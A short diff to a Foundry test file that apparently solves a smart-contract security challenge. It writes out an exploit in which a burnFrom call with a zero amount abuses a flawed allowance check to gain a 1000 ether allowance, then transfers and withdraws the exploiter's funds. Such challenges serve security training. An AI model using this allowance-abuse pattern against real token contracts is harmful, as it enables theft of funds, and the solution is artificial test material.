@@ -36,9 +36,11 @@ contract Challenge1Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-    
-
+        mETH.approve(exploiter, 1000 ether);
+        // @audit will approve an allowance of 1000 ether from exploiter to whitehat. because of error in burnFromLogic 
+        mETH.burnFrom(exploiter, 0);
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+        mETH.withdraw(1000 ether);
         //==================================================//
         vm.stopPrank();
 
